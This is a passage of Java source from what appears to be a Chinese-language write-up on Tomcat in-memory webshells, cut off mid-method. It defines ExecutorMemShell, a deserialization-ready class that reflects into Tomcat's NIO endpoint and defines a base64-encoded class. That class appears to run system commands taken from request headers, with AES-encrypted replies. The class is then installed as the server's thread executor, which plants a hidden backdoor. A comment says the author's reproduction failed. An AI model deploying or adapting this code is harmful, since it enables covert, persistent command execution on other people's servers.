            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);
            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));
            byte[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            byte[] byteAES = cipher.doFinal(byteEncode);
            return base64Encoder.encodeToString(byteAES);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }
}
```

ExecutorMemShell：

```
package org.example.tomcatmemshell.Executor;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.tomcat.util.net.NioEndpoint;

import java.util.Base64;
import java.util.concurrent.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

//复现失败，不推荐使用

public class ExecutorMemShell extends AbstractTranslet{

    public ExecutorMemShell() {
        try{
            Thread TaskThread = Thread.currentThread();
            ThreadGroup threadGroup = TaskThread.getThreadGroup();
            Thread[] threads = (Thread[]) getClassField(ThreadGroup.class,threadGroup,"threads");
            for(Thread thread:threads) {
                if (thread.getName().contains("http-nio") && thread.getName().contains("ClientPoller-1")) {
                    Object target = getClassField(Thread.class, thread, "target");
                    NioEndpoint this0 = (NioEndpoint) getClassField(Class.forName("org.apache.tomcat.util.net.NioEndpoint$Poller"), target, "this$0");
                    try {
                        byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQB+QoBFwEYCAEZBwEaCgEbARwKAR0BHgoAgQEfCQEgASEKAAMBIgoBIwEkCgB4ASUKASYBJwoBJgEoBwEpCADZCgAvASoHAMMKASYBKwgBLAoAAwEtCAC7CgAvAS4HAS8KATABMQgBMggBMwgBNAcBNQoAGwE2CwE3ATgLATcBOQgBOggBOwcAswgBPAcBPgoAIwE/CgEwAUAIAUEKAAMBQggBQwoAAwFECgEjAUUIAUYKAAMBRwoAAwFICgADAUkHAUoIAUsKAC8BTAoBMAFNCgAjAU4HAU8KASMBUAoAAwFRCAFSCAFTCAFUCAChCAFVCAFWBwFXCgA9ATYHAVgIAVkIANQHAVoIAVsKAC8BXAoAQgFdCgAvAV4HAV8HAWAKAEgBYQcBYgoBYwFkCgFjAWUKAWYBZwcBaAoATgFpBwFqCgBQAWsIAWwKAFABbQcBbgoAVAFRCgBUAW8KAFQBcAkBcQFyCgADAXMKAC8BdAcBdQoAWwF2CQF3AXgKAC8BeQoAYAF6BwF7CgF8AX0KAX4BfwoBfgGACgF8AYEHAYIKAAMBgwgAfAoAZQFCCAGECgBrAYUHAYYHAYcJAC8BiAoAbAEiCgBrAYkJAC8BigoAhgGLCgBrAYwKAAMBjQoANAF2CQAvAY4KAIEBjwoBFwGQBwGRAQASREVGQVVMVF9TRUNSRVRfS0VZAQASTGphdmEvbGFuZy9TdHJpbmc7AQANQ29uc3RhbnRWYWx1ZQEAA0FFUwEABktFWV9WSQEAAltCAQAQQ0lQSEVSX0FMR09SSVRITQEADWJhc2U2NEVuY29kZXIHAZIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAaTGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcjsBAA1iYXNlNjREZWNvZGVyBwGTAQAHRGVjb2RlcgEAGkxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZzdHJpbmcBAApFeGNlcHRpb25zAQAGPGluaXQ+AQCcKElJSkxqYXZhL3V0aWwvY29uY3VycmVudC9UaW1lVW5pdDtMamF2YS91dGlsL2NvbmN1cnJlbnQvQmxvY2tpbmdRdWV1ZTtMamF2YS91dGlsL2NvbmN1cnJlbnQvVGhyZWFkRmFjdG9yeTtMamF2YS91dGlsL2NvbmN1cnJlbnQvUmVqZWN0ZWRFeGVjdXRpb25IYW5kbGVyOylWAQAEdGhpcwEANExvcmcvZXhhbXBsZS90b21jYXRtZW1zaGVsbC9FeGVjdXRvci9UaHJlYWRFeGVjdXRvcjsBAAxjb3JlUG9vbFNpemUBAAFJAQAPbWF4aW11bVBvb2xTaXplAQANa2VlcEFsaXZlVGltZQEAAUoBAAR1bml0AQAfTGphdmEvdXRpbC9jb25jdXJyZW50L1RpbWVVbml0OwEACXdvcmtRdWV1ZQEAJExqYXZhL3V0aWwvY29uY3VycmVudC9CbG9ja2luZ1F1ZXVlOwEADXRocmVhZEZhY3RvcnkBACRMamF2YS91dGlsL2NvbmN1cnJlbnQvVGhyZWFkRmFjdG9yeTsBAAdoYW5kbGVyAQAvTGphdmEvdXRpbC9jb25jdXJyZW50L1JlamVjdGVkRXhlY3V0aW9uSGFuZGxlcjsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA6TGphdmEvdXRpbC9jb25jdXJyZW50L0Jsb2NraW5nUXVldWU8TGphdmEvbGFuZy9SdW5uYWJsZTs+OwEACVNpZ25hdHVyZQEAsihJSUpMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7TGphdmEvdXRpbC9jb25jdXJyZW50L0Jsb2NraW5nUXVldWU8TGphdmEvbGFuZy9SdW5uYWJsZTs+O0xqYXZhL3V0aWwvY29uY3VycmVudC9UaHJlYWRGYWN0b3J5O0xqYXZhL3V0aWwvY29uY3VycmVudC9SZWplY3RlZEV4ZWN1dGlvbkhhbmRsZXI7KVYBAAtnZXRSZXF1ZXN0MgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQABYgEAAWEBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAQbmlvU29ja2V0V3JhcHBlcgEAEE5pb1NvY2tldFdyYXBwZXIBADlMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9uZXQvTmlvRW5kcG9pbnQkTmlvU29ja2V0V3JhcHBlcjsBAAN0bXABABJMamF2YS9sYW5nL09iamVjdDsBAA1zZWxlY3Rpb25LZXlzAQAhW0xqYXZhL25pby9jaGFubmVscy9TZWxlY3Rpb25LZXk7AQADb2JqAQAKbGlua2VkTGlzdAEAFkxqYXZhL3V0aWwvTGlua2VkTGlzdDsBAAV2YXIxMQEABWJ5dGVzAQADYnVmAQAVTGphdmEvbmlvL0J5dGVCdWZmZXI7AQAGdGFyZ2V0AQAKdGhyZWFkTmFtZQEABnRocmVhZAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAClRhc2tUaHJlYWQBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIdGhyZWFkczEBABNbTGphdmEvbGFuZy9UaHJlYWQ7AQANU3RhY2tNYXBUYWJsZQcBSgcBlAcBKQcBGgcBewcAfgcBlQcBNQcBlgcBPgcBTwEAC2dldFJlc3BvbnNlAQAFKFtCKVYBAAdyZXF1ZXN0AQAfTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3RJbmZvOwEACHJlc3BvbnNlAQAoTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEACnRtcF9vYmplY3QBAAdvYmplY3RzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAHdGhyZWFkcwEAA3JlcwcBVwEAB2V4ZWN1dGUBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAxyZXN1bHRSZWFkZXIBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAhzdGRJbnB1dAEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAAXMBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAdjb21tYW5kAQAUTGphdmEvbGFuZy9SdW5uYWJsZTsBAANjbWQHAS8HAV8HAWIHAZcHAZgHAZkHAWgHAWoHAXUBAAhnZXRGaWVsZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQANZGVjbGFyZWRGaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAZvYmplY3QBAAlmaWVsZE5hbWUBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7BwGaBwGbAQAGZGVjb2RlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlzZWNyZXRLZXkBABhMamF2YXgvY3J5cHRvL1NlY3JldEtleTsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAtieXRlQ29udGVudAEACmJ5dGVEZWNvZGUBAANrZXkBAAdjb250ZW50AQAGZW5jb2RlAQAKYnl0ZUVuY29kZQEAB2J5dGVBRVMBAA1nZXRDbGFzc0ZpZWxkAQBJKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABWZpZWxkAQADdmFyAQAIPGNsaW5pdD4BAAMoKVYBAApTb3VyY2VGaWxlAQATVGhyZWFkRXhlY3V0b3IuamF2YQcBnAwBnQGeAQBHdGFyZ2V0L2NsYXNzZXMvb3JnL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvRXhlY3V0b3IvVGhyZWFkRXhlY3V0b3IuY2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwGfDAGgAaEHAaIMAaMBpAwBDAGlBwGmDAGnAagMAJIA0QcBqQwBqgGrDACSAJMHAZQMAawBrQwBrgGvAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwDAEPARAMAbAAqAEABkNsaWVudAwBsQGyDAD4APkBABJqYXZhL2xhbmcvUnVubmFibGUHAZUMAbMBtAEACHNlbGVjdG9yAQANa3F1ZXVlV3JhcHBlcgEACnVwZGF0ZUxpc3QBABRqYXZhL3V0aWwvTGlua2VkTGlzdAwBtQG2BwGWDAG3AbgMAbkBugEAB2NoYW5uZWwBAARrZXlzAQAKYXR0YWNobWVudAcBuwEAN29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L05pb0VuZHBvaW50JE5pb1NvY2tldFdyYXBwZXIMAbwBvQwBvgG/AQAFVVRGLTgMAJIBwAEABWJsdWUwDAHBAcIMAaoBwwEAAQ0MAcEBxAwBxQHGDAHHAcgBADJvcmcvZXhhbXBsZS90b21jYXRtZW1zaGVsbC9FeGVjdXRvci9UaHJlYWRFeGVjdXRvcgEAEGJsdWVibHVlYmx1ZWJsdWUMAQIBAwwByQHKDAHLAcwBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAGqAc0MAJIBFAEABGV4ZWMBAAhBY2NlcHRvcgEABnRoaXMkMAEABmdsb2JhbAEACnByb2Nlc3NvcnMBABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAdb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdEluZm8BAANyZXEBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEADFNlcnZlci10b2tlbgwBDAEDDAHOAc8MAKcAqAEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDACSAdABACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcBlwwB0QHSDAFSAdMHAZgMAdQB1QEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAJIB1gEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMAJIB1wEAAAwB2ACoAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAdkB2gwB2wCoBwHcDAHdAd4MAd8B4AwA0ADRAQATamF2YS9pby9JT0V4Y2VwdGlvbgwB4QEUBwHiDAHjAJwMANwB5AwB5QHmAQAQamF2YS9sYW5nL09iamVjdAcBmgwB5wHoBwHpDAHqAesMAaAB7AwB7QHmAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwB3wG/AQAUQUVTL0NCQy9QS0NTNVBhZGRpbmcMAe4B7wEAE2phdmF4L2NyeXB0by9DaXBoZXIBACFqYXZheC9jcnlwdG8vc3BlYy9JdlBhcmFtZXRlclNwZWMMAH0AfgwB8AHxDACFAIgMAQIB8gwB8wGlDACSAfQMAIAAhAwB9QH2DAH3AfgBADFvcmcvYXBhY2hlL3RvbWNhdC91dGlsL3RocmVhZHMvVGhyZWFkUG9vbEV4ZWN1dG9yAQAYamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyAQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAQamF2YS9sYW5nL1RocmVhZAEAE2phdmEvbmlvL0J5dGVCdWZmZXIBABJqYXZhL3V0aWwvSXRlcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAD2phdmEvbGFuZy9DbGFzcwEAJmphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQATamF2YS9uaW8vZmlsZS9QYXRocwEAA2dldAEAOyhMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25pby9maWxlL1BhdGg7AQATamF2YS9uaW8vZmlsZS9GaWxlcwEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgEABihbQilbQgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEABHdyYXABABkoW0IpTGphdmEvbmlvL0J5dGVCdWZmZXI7AQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAJm9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L05pb0VuZHBvaW50AQAEcmVhZAEAGShaTGphdmEvbmlvL0J5dGVCdWZmZXI7KUkBAAVhcnJheQEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAQoSSlWAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpSQEABmxlbmd0aAEAAygpSQEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBAAhwb3NpdGlvbgEAFChJKUxqYXZhL25pby9CdWZmZXI7AQAGdW5SZWFkAQAYKExqYXZhL25pby9CeXRlQnVmZmVyOylWAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAJYWRkSGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAIWphdmEvbmlvL2NoYXJzZXQvU3RhbmRhcmRDaGFyc2V0cwEABVVURl84AQAaTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDsBAAhnZXRCeXRlcwEAHihMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OylbQgEAD3ByaW50U3RhY2tUcmFjZQEAHWphdmEvdXRpbC9jb25jdXJyZW50L1RpbWVVbml0AQAMTUlMTElTRUNPTkRTAQA3KExqYXZhL2xhbmcvUnVubmFibGU7SkxqYXZhL3V0aWwv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");
//                        ClassLoader classLoader = ClassLoader.getSystemClassLoader();//不能使用，找不到Tomcat下的类,如java.lang.NoClassDefFoundError: org/apache/tomcat/util/threads/ThreadPoolExecutor
                        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
                        Method defineClass = ClassLoader.class.getDeclaredMethod(
                                "defineClass", String.class, byte[].class, int.class, int.class
                        );
                        defineClass.setAccessible(true);
                        Class<?> ThreadExecutorClass = (Class<?>) defineClass.invoke(classLoader,
                                "org.example.tomcatmemshell.Executor.ThreadExecutor" , classBytes, 0, classBytes.length
                        );
                        ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) getClassField(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"),this0, "executor");
                        Object instance = ThreadExecutorClass.getDeclaredConstructor(int.class,int.class,long.class,TimeUnit.class,BlockingQueue.class,ThreadFactory.class,RejectedExecutionHandler.class).newInstance(threadPoolExecutor.getCorePoolSize(), threadPoolExecutor.getMaximumPoolSize(), threadPoolExecutor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, threadPoolExecutor.getQueue(), threadPoolExecutor.getThreadFactory(), threadPoolExecutor.getRejectedExecutionHandler());

                        this0.setExecutor((Executor) instance);
                        System.out.println("Inject done!");
                    }catch (Exception ignore){
                        ignore.printStackTrace();
                    }
                    break;
                }
            }
        } catch (NoSuchFieldException ex) {
            throw new RuntimeException(ex);
